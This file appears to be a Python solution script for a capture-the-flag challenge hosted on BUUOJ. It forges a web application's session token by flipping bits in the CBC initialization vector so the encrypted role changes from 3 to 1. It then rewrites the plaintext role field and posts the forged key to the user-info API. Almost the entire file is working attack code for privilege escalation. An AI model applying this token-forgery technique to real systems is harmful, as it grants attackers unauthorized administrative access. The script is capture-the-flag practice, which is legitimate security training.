import time

import requests
import base64
import json

host = "a1822124-6616-47cb-b0ac-6798a97d7c37.node4.buuoj.cn"
port = 81


def cbc_attack(key, block, origin_content, target_content):
    user_key_decode = base64.b64decode(key)
    #print(user_key_decode)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode['signed_key']
    #print(signed_key)
    cipher_o = base64.b64decode(signed_key)
    #print(cipher_o)
    if block > 0:
        iv_prefix = cipher_o[:block * 16]
    else:
        iv_prefix = b''
    iv = cipher_o[block * 16:16 + block * 16]
    cipher = cipher_o[16 + block * 16:]
    iv_array = bytearray(iv)
    for i in range(0, 16):
        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])
    iv = bytes(iv_array)
    #print(iv)
    user_key_json_decode['signed_key'] = base64.b64encode(iv_prefix + iv + cipher).decode('utf-8')
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), "utf-8"))


def get_user_info(key):
    r = requests.post("http://" + host + ":" + str(port) + "/frontend/api/v1/user/info", headers={"Key": key})
    if r.json()['code'] == 100:
        print("获取成功！")
    return r.json()['data']


def modify_role_plain(key, role):
    user_key_decode = base64.b64decode(user_key)
    user_key_json_decode = json.loads(user_key_decode)
    user_key_json_decode['role'] = role
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), 'utf-8')).decode('utf-8')


user_key = cbc_attack(
    "eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVS\
HNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4Lysx\
WldiMU1CUTNxVEplL2lGcExsbTlUNGxFQkZrOFNmQ1lvRW96MTdMQlp\
jV25VOS92WkxuMHBiVVliakF3RUJqV0s1ZldXb3ZIeG1JRG9wRHFHTVF\
jQ0tBPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiMVU1\
Rm0zWGk3VE12dllGaFZxQkluVWZ2MGJxNEFpTWYiLCJleHBpcmVfaW4iO\
jE1NzA1MjU0MTB9", 0, '{"role":3,"user_', '{"role":1,"user_')
user_key = modify_role_plain(user_key, 1)
print(user_key)
